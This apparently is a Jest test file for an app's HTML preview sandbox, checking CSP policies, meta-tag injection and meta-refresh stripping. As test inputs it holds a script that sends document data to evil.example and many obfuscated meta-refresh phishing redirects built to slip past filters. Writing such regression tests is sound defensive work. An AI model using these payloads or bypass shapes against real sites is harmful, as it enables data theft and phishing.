import {
  CHART_PREVIEW_CSP,
  HTML_EXPORT_CSP,
  PDF_PREVIEW_CSP,
  PREVIEW_CSP,
  PREVIEW_CSP_INLINE,
  PREVIEW_CSP_LIVE,
  PREVIEW_VIEWPORT,
  injectPreviewCsp,
} from "@/lib/preview/previewSandbox";
import { prepareHtmlRunDocument } from "@/lib/preview/htmlRunDocument";
import { stripScripts } from "@/lib/preview/htmlScriptStrip";

/** The CSP meta prepareHtmlRunDocument writes into the page: the one pragma it keeps. */
const RUN_CSP_TAG = `<meta http-equiv="Content-Security-Policy" content="${PREVIEW_CSP_LIVE}">`;

/** The model's page in the Run tab: its sandboxed frame's srcdoc, decoded. */
function runPage(html: string): string {
  const frame = /<iframe [^>]*srcdoc="([^"]*)"><\/iframe>/.exec(prepareHtmlRunDocument(html));
  if (!frame) throw new Error("no page frame");
  return frame[1].replace(/&quot;/g, '"').replace(/&amp;/g, "&");
}

/**
 * How many times "http-equiv" sits where an attribute name can start (after
 * whitespace, "/" or a quote), so a browser could read it as a pragma. Test inputs
 * hold the word only as an attribute name, so 0 means no live pragma is left; in a
 * Run document the one left must be the app's own CSP.
 */
function pragmaNames(html: string): number {
  return (html.match(/(?<![\w-])http-equiv/gi) ?? []).length;
}

describe("PREVIEW_VIEWPORT", () => {
  it("does not lock pinch zoom or system text scaling", () => {
    expect(PREVIEW_VIEWPORT).toContain("width=device-width");
    expect(PREVIEW_VIEWPORT).not.toContain("maximum-scale");
  });
});

describe("PREVIEW_CSP", () => {
  it("blocks network egress and forms, allows inline scripts only", () => {
    expect(PREVIEW_CSP).toContain("default-src 'none'");
    expect(PREVIEW_CSP).toContain("script-src 'unsafe-inline'");
    expect(PREVIEW_CSP).toContain("style-src 'unsafe-inline'");
    expect(PREVIEW_CSP).toContain("connect-src 'none'");
    expect(PREVIEW_CSP).toContain("form-action 'none'");
    expect(PREVIEW_CSP).toContain("base-uri 'none'");
    expect(PREVIEW_CSP).toContain("sandbox allow-scripts");
  });

  it("PREVIEW_CSP_INLINE keeps egress locks without meta sandbox", () => {
    expect(PREVIEW_CSP_INLINE).toContain("connect-src 'none'");
    expect(PREVIEW_CSP_INLINE).not.toContain("sandbox");
    expect(PREVIEW_CSP.startsWith(PREVIEW_CSP_INLINE)).toBe(true);
  });

  it("PREVIEW_CSP_LIVE allowlists known CDNs instead of open https", () => {
    expect(PREVIEW_CSP_LIVE).toContain("https://cdn.jsdelivr.net");
    expect(PREVIEW_CSP_LIVE).toContain("https://unpkg.com");
    expect(PREVIEW_CSP_LIVE).toContain("https://cdnjs.cloudflare.com");
    expect(PREVIEW_CSP_LIVE).toContain("https://fonts.googleapis.com");
    expect(PREVIEW_CSP_LIVE).toContain("https://fonts.gstatic.com");
    expect(PREVIEW_CSP_LIVE).toContain("form-action 'none'");
    expect(PREVIEW_CSP_LIVE).toContain("frame-src 'none'");
    expect(PREVIEW_CSP_LIVE).not.toContain("sandbox");
    expect(PREVIEW_CSP_LIVE).not.toContain("https: http:");
    const tokens = PREVIEW_CSP_LIVE.split(/[;\s]+/);
    expect(tokens).not.toContain("https:");
    expect(tokens).not.toContain("http:");
  });
});

describe("PREVIEW_CSP egress details", () => {
  it("blocks https on script/style (external script-src exfiltration)", () => {
    // connect-src 'none' alone is not enough: <script src="https://evil/?…">
    // still fires a GET. Inline-only preview — no CDN hosts.
    const scriptSrc = PREVIEW_CSP.match(/script-src\s+([^;]+)/)?.[1].trim();
    const styleSrc = PREVIEW_CSP.match(/style-src\s+([^;]+)/)?.[1].trim();
    expect(scriptSrc).toBe("'unsafe-inline'");
    expect(styleSrc).toBe("'unsafe-inline'");
    for (const value of [scriptSrc, styleSrc]) {
      expect(value).not.toContain("https:");
      expect(value).not.toContain("*");
    }
  });

  it("blocks https on img/font/media (passive GET exfiltration)", () => {
    // connect-src 'none' alone is not enough: <img src="https://attacker/…">
    // still fires a GET when the DOM parses. Mermaid inherits this CSP.
    const imgSrc = PREVIEW_CSP.match(/img-src\s+([^;]+)/)?.[1].trim();
    const fontSrc = PREVIEW_CSP.match(/font-src\s+([^;]+)/)?.[1].trim();
    const mediaSrc = PREVIEW_CSP.match(/media-src\s+([^;]+)/)?.[1].trim();
    expect(imgSrc).toBe("data: blob:");
    expect(fontSrc).toBe("data:");
    expect(mediaSrc).toBe("data: blob:");
    for (const value of [imgSrc, fontSrc, mediaSrc]) {
      expect(value).not.toContain("https:");
      expect(value).not.toContain("*");
    }
  });
});

describe("PDF_PREVIEW_CSP", () => {
  it("allows a blob worker (pdf.js worker is vendored inline) and blocks all network egress", () => {
    // pdf.js + its worker are vendored and inlined; the worker is built from a
    // Blob URL at runtime, so the CSP must allow `worker-src blob:` while
    // keeping `connect-src 'none'` (no network fetch is needed — the PDF bytes
    // are inlined as base64).
    expect(PDF_PREVIEW_CSP).toContain("worker-src blob:");
    expect(PDF_PREVIEW_CSP).toContain("connect-src 'none'");
  });

  it("keeps the rest of the policy as locked-down as PREVIEW_CSP", () => {
    expect(PDF_PREVIEW_CSP).toContain("default-src 'none'");
    expect(PDF_PREVIEW_CSP).toContain("script-src 'unsafe-inline'");
    expect(PDF_PREVIEW_CSP).not.toContain("script-src 'unsafe-inline' https:");
    expect(PDF_PREVIEW_CSP).toContain("form-action 'none'");
    expect(PDF_PREVIEW_CSP).toContain("base-uri 'none'");
    expect(PDF_PREVIEW_CSP).toContain("sandbox allow-scripts");
  });

  it("does NOT allow connect-src to any origin (no exfiltration, no CDN)", () => {
    // The connect-src must be 'none' — not 'https:' (any HTTPS origin), not a
    // CDN host, not '*'. pdf.js no longer fetches anything at runtime.
    const connectSrcMatch = PDF_PREVIEW_CSP.match(/connect-src\s+([^;]+)/);
    expect(connectSrcMatch).not.toBeNull();
    const connectSrcValue = connectSrcMatch![1].trim();
    expect(connectSrcValue).toBe("'none'");
    expect(connectSrcValue).not.toBe("https:");
    expect(connectSrcValue).not.toBe("*");
    expect(connectSrcValue).not.toContain("cdnjs.cloudflare.com");
  });

  it("lets a PDF fetch nothing: no file and no network in any directive", () => {
    // A PDF is untrusted and pdf.js has had script-capable bugs: images, fonts
    // and media load only from the page itself (data:, blob:).
    expect(PDF_PREVIEW_CSP).not.toMatch(/file:|https?:|\*/);
    for (const directive of ["img-src", "font-src", "media-src"]) {
      const value = new RegExp(`${directive}\\s+([^;]+)`).exec(PDF_PREVIEW_CSP)?.[1].trim();
      expect(value?.split(/\s+/).every((source) => source === "data:" || source === "blob:")).toBe(true);
    }
  });

  it("allows worker-src only for blob: (not arbitrary origins)", () => {
    const workerSrcMatch = PDF_PREVIEW_CSP.match(/worker-src\s+([^;]+)/);
    expect(workerSrcMatch).not.toBeNull();
    const workerSrcValue = workerSrcMatch![1].trim();
    expect(workerSrcValue).toBe("blob:");
  });
});

describe("CHART_PREVIEW_CSP", () => {
  it("allows unsafe-eval so Vega can compile expressions, without network egress", () => {
    expect(CHART_PREVIEW_CSP).toContain("script-src 'unsafe-inline' 'unsafe-eval'");
    expect(CHART_PREVIEW_CSP).toContain("connect-src 'none'");
    expect(CHART_PREVIEW_CSP).toContain("default-src 'none'");
    expect(CHART_PREVIEW_CSP).toContain("form-action 'none'");
    expect(CHART_PREVIEW_CSP).toContain("base-uri 'none'");
  });

  it("does not open script-src to https (eval is chart-only, not CDN)", () => {
    const scriptSrc = CHART_PREVIEW_CSP.match(/script-src\s+([^;]+)/)?.[1].trim();
    expect(scriptSrc).toBe("'unsafe-inline' 'unsafe-eval'");
    expect(scriptSrc).not.toContain("https:");
  });

  it("does not leak eval onto the user-HTML preview CSP", () => {
    expect(PREVIEW_CSP).not.toContain("unsafe-eval");
    expect(PREVIEW_CSP).toContain("script-src 'unsafe-inline'");
  });
});

describe("injectPreviewCsp", () => {
  const meta = (csp: string = PREVIEW_CSP) =>
    `<meta http-equiv="Content-Security-Policy" content="${csp}">`;

  it("puts the CSP meta first, after the DOCTYPE, so it is the head's first child", () => {
    const html = "<!DOCTYPE html><html><head><title>x</title></head><body></body></html>";
    expect(injectPreviewCsp(html)).toBe(
      `<!DOCTYPE html>${meta()}<html><head><title>x</title></head><body></body></html>`,
    );
  });

  it("does the same with no <head> tag, a lower-case DOCTYPE or whitespace before it", () => {
    expect(injectPreviewCsp("<!DOCTYPE html><html><body><p>hi</p></body></html>")).toBe(
      `<!DOCTYPE html>${meta()}<html><body><p>hi</p></body></html>`,
    );
    expect(injectPreviewCsp("\n  <!doctype html>\n<html></html>")).toBe(
      `\n  <!doctype html>${meta()}\n<html></html>`,
    );
  });

  it("puts the CSP meta first in a document with no DOCTYPE", () => {
    expect(injectPreviewCsp("<html><head></head><body></body></html>")).toBe(
      `${meta()}<html><head></head><body></body></html>`,
    );
    // Not HTML whitespace before the DOCTYPE: the browser reads it as text, so it is not skipped.
    expect(injectPreviewCsp("\u00A0<!DOCTYPE html><html></html>").startsWith(meta())).toBe(true);
  });

  it("wraps bare HTML into a document with the CSP", () => {
    const out = injectPreviewCsp("<p>hello</p>");
    expect(out).toBe(`<!DOCTYPE html><html><head>${meta()}</head><body><p>hello</p></body></html>`);
  });

  it("only injects a single CSP meta (idempotent-ish for one pass)", () => {
    const html = "<html><head></head><body></body></html>";
    const out = injectPreviewCsp(html);
    const count = (out.match(/Content-Security-Policy/g) || []).length;
    expect(count).toBe(1);
  });

  // BUG FIX (A3): a <head> tag that comes after body content is ignored by the
  // parser, which already closed an implied head; the meta used to be spliced
  // after that tag, so it sat in <body>, where a browser ignores a CSP meta
  // (HTML §4.2.5.3). The document ran with no policy at all.
  it.each([
    ["text", "<!DOCTYPE html><html>x<head><title>t</title></head><body></body></html>"],
    ["a paragraph", "<!DOCTYPE html><html><p>x</p><head></head><body></body></html>"],
    ["an image", "<!DOCTYPE html><html><img src=x><head></head><body></body></html>"],
    ["a textarea", "<!DOCTYPE html><html><textarea>t</textarea><head></head><body></body></html>"],
    ["a body tag", "<!DOCTYPE html><html><body></body><head></head></html>"],
  ])("keeps the CSP in the head when %s comes before the <head> tag", (_what, html) => {
    const out = injectPreviewCsp(html);
    expect(out).toBe(`<!DOCTYPE html>${meta()}${html.slice("<!DOCTYPE html>".length)}`);
  });

  it("puts the CSP before scripts that appear before <head>, so they run under it", () => {
    const html =
      "<html><script>window.pwned=1</script><head><title>x</title></head><body></body></html>";
    const out = injectPreviewCsp(html);
    expect(out.startsWith(meta())).toBe(true);
    expect(out.indexOf(meta())).toBeLessThan(out.indexOf("window.pwned"));
  });

  // BUG FIX (was a confirmed sandbox escape): a decoy "<head" inside a
  // <script> comment (or <style>/HTML comment/<textarea>/<title>/an attribute)
  // that appears before the real <head> used to fool the plain-text search into
  // splicing the CSP meta into that inert block instead — leaving the real
  // document with no CSP at all, and the attacker's script running with
  // full network egress despite connect-src 'none'. Nothing is searched for
  // now: the CSP is the first element, ahead of every decoy and script.
  it.each([
    [
      "a <script> comment",
      '<!DOCTYPE html><html><script>\n// <head>\nfetch("https://evil.example/steal?x=" + document.title);\n</script>\n<head><title>Legit</title></head><body>Hello</body></html>',
    ],
    [
      "a <style> block",
      "<!DOCTYPE html><html><style>/* <head> */ body { color: red; }</style><head><title>Real</title></head><body></body></html>",
    ],
    [
      "an HTML comment",
      "<!DOCTYPE html><html><!-- <head> --><head><title>Real</title></head><body></body></html>",
    ],
    [
      "a <textarea>",
      "<!DOCTYPE html><html><textarea>sample: <head> tag</textarea><head><title>Real</title></head><body></body></html>",
    ],
    [
      "an attribute",
      '<!DOCTYPE html><html title="<head>"><head><title>Real</title></head><body></body></html>',
    ],
  ])("is not fooled by a decoy <head> inside %s", (_where, html) => {
    expect(injectPreviewCsp(html)).toBe(
      `<!DOCTYPE html>${meta()}${html.slice("<!DOCTYPE html>".length)}`,
    );
  });
});

describe("HTML_EXPORT_CSP", () => {
  const directives = HTML_EXPORT_CSP.split(";").map((d) => d.trim());

  it("is exactly the export policy: no script, inline styles, data/https images, no base or forms", () => {
    expect(directives).toEqual([
      "default-src 'none'",
      "style-src 'unsafe-inline'",
      "img-src data: https:",
      "base-uri 'none'",
      "form-action 'none'",
    ]);
  });

  it("never allows script, eval, connections or frames", () => {
    expect(HTML_EXPORT_CSP).not.toMatch(/script-src|unsafe-eval|connect-src|frame-src|child-src/);
    expect(HTML_EXPORT_CSP).not.toContain("http:");
  });
});

// A2: the meta-refresh strip was one regex that wanted whitespace before
// http-equiv and a literal "refresh", so "/" between attributes, an encoded
// value or a ">" in an earlier quoted value walked past it. Every shape below
// must leave no live pragma on either path: the Run tab (its own CSP aside) and
// the stripped copy that Open in browser / Share hand to the system browser.
describe("meta pragmas (A2)", () => {
  const EVIL = "https://evil.example/phish";
  const REFRESH_SHAPES: [string, string][] = [
    ["'/' before the attribute", `<meta/http-equiv=refresh content="0;url=${EVIL}">`],
    ["a tab before the attribute", `<meta\thttp-equiv=refresh content="0;url=${EVIL}">`],
    ["a newline before the attribute", `<meta\nhttp-equiv=refresh content="0;url=${EVIL}">`],
    ["a form feed before the attribute", `<meta\fhttp-equiv=refresh content="0;url=${EVIL}">`],
    ["a carriage return before the attribute", `<meta\rhttp-equiv=refresh content="0;url=${EVIL}">`],
    ["'/' between attributes", `<meta content="0;url=${EVIL}"/http-equiv=refresh>`],
    ["no space after a quoted value", `<meta content="0;url=${EVIL}"http-equiv=refresh>`],
    ["an upper-case tag, name and value", `<META HTTP-EQUIV="REFRESH" CONTENT="0;URL=${EVIL}">`],
    ["mixed case, single quotes", `<MeTa Http-Equiv='ReFresh' content='0;url=${EVIL}'>`],
    ["an unquoted value", `<meta http-equiv=refresh content=0;url=${EVIL}>`],
    ["whitespace around '='", `<meta http-equiv = "refresh" content = "0;url=${EVIL}">`],
    ["a decimal entity in the value", `<meta http-equiv="&#114;efresh" content="0;url=${EVIL}">`],
    ["a hex entity in the value", `<meta http-equiv="re&#x66;resh" content="0;url=${EVIL}">`],
    [
      "a fully encoded value",
      `<meta http-equiv="&#x72;&#x65;&#x66;&#x72;&#x65;&#x73;&#x68;" content="0;url=${EVIL}">`,
    ],
    [
      "extra attributes before and after",
      `<meta name="x" data-a=1 http-equiv="refresh" content="0;url=${EVIL}" id=y>`,
    ],
    ["'>' in an earlier double-quoted value", `<meta content="a>b" http-equiv=refresh>`],
    [
      "'>' in an earlier single-quoted value",
      `<meta name='a>b' http-equiv="refresh" content="0;url=${EVIL}">`,
    ],
    ["a self-closing tag", `<meta http-equiv="refresh" content="0;url=${EVIL}" />`],
    ["the attribute twice", `<meta http-equiv=x HTTP-EQUIV=refresh content="0;url=${EVIL}">`],
    ["no closing '>' (the app's next text closes it)", `<p>hi</p><meta http-equiv=refresh content="0;url=${EVIL}"`],
    [
      "a dead tag in a comment running over a live one",
      `<!-- <meta title=' --><meta http-equiv=refresh content="0;url=${EVIL}"><p>'</p>`,
    ],
  ];

  // Every http-equiv a preview could meet, not only refresh: none is needed
  // (the charset comes from how the page is loaded) and some act on their own.
  const OTHER_PRAGMAS: [string, string][] = [
    ["set-cookie", `<meta http-equiv="set-cookie" content="sid=1; path=/">`],
    ["a second content-security-policy", `<meta http-equiv="Content-Security-Policy" content="default-src *">`],
    ["default-style", `<meta http-equiv="default-style" content="dark">`],
    ["x-dns-prefetch-control", `<meta http-equiv="x-dns-prefetch-control" content="on">`],
    ["content-type", `<meta http-equiv="content-type" content="text/html; charset=iso-2022-jp">`],
  ];

  describe.each([...REFRESH_SHAPES, ...OTHER_PRAGMAS])("%s", (_shape, meta) => {
    it("the Run tab's page keeps only its own CSP", () => {
      const out = runPage(`<!DOCTYPE html><html><head>${meta}</head><body><p>ok</p>${meta}</body></html>`);
      expect(pragmaNames(out)).toBe(1);
      expect(out.startsWith(`<!DOCTYPE html>${RUN_CSP_TAG}<script>(function () {`)).toBe(true);
    });

    it("the Run tab's page disarms it in a bare fragment", () => {
      const out = runPage(`<p>ok</p>${meta}`);
      expect(pragmaNames(out)).toBe(1);
      expect(out).toContain(`${RUN_CSP_TAG}<script>`);
    });

    it("stripScripts leaves no pragma", () => {
      expect(pragmaNames(stripScripts(`<p>ok</p>${meta}<p>after</p>`))).toBe(0);
    });
  });

  it("stripScripts does not turn a removed meta into a live <script>", () => {
    // On main, deleting the meta joined "<scr" and "ipt>" into a real script tag.
    const out = stripScripts(`<scr<meta http-equiv=refresh content="0;url=${EVIL}">ipt>alert(1)</script>`);
    expect(out).not.toMatch(/<script/i);
    expect(pragmaNames(out)).toBe(0);
  });

  it("stripScripts disarms a pragma that its URL filter pieces together", () => {
    // Removing the javascript: href joins "http-equ" and "iv" into http-equiv.
    const out = stripScripts(`<meta http-equ href="javascript:x"iv=refresh content="0;url=${EVIL}">`);
    expect(pragmaNames(out)).toBe(0);
  });

  it("stripScripts pieces no meta together when it removes a script", () => {
    // A removed script leaves a space (lib/preview/htmlScriptStrip.ts), so "<me" and "ta"
    // stay apart: an unknown <me> tag, never a <meta>.
    const out = stripScripts(`<me<script></script>ta http-equiv=refresh content="0;url=${EVIL}">`);
    expect(out).toBe(`<me ta http-equiv=refresh content="0;url=${EVIL}">`);
    expect(out).not.toMatch(/<meta/i);
  });

  it("the Run tab removes nothing from the page, so no pragma is pieced together", () => {
    // The CSP goes first in the document (A3), so no script before <head> is
    // dropped to keep it covered, and "<me" and "ta ..." never join into a meta.
    const html = `<html><me<script></script>ta http-equiv=refresh content="0;url=${EVIL}"><head></head><body></body></html>`;
    const out = runPage(html);
    expect(out.startsWith(`${RUN_CSP_TAG}<script>(function () {`)).toBe(true);
    expect(out).toContain(html);
    expect(out).not.toMatch(/<meta[\t\n\f\r /]+http-equiv=refresh/i);
  });

  it("puts the stay script after the real CSP, not a decoy in a comment", () => {
    const out = runPage(
      '<html><!-- <meta http-equiv="Content-Security-Policy" content="x"> --><head></head><body></body></html>',
    );
    expect(out.startsWith(`${RUN_CSP_TAG}<script>(function () {`)).toBe(true);
    expect(pragmaNames(out)).toBe(1);
  });

  it("puts the stay script after the real CSP even when the page copies that tag", () => {
    const out = runPage(`<html><!-- ${RUN_CSP_TAG} --><head></head><body></body></html>`);
    expect(out).toContain(`<!-- ${RUN_CSP_TAG} -->`);
    expect(out.startsWith(`${RUN_CSP_TAG}<script>(function () {`)).toBe(true);
  });

  it("stripScripts leaves ordinary metas and prose about http-equiv alone", () => {
    const html =
      '<meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1">' +
      "<p>The http-equiv attribute: <code>&lt;meta http-equiv=&quot;refresh&quot;&gt;</code></p>";
    expect(stripScripts(html)).toBe(html);
  });
});
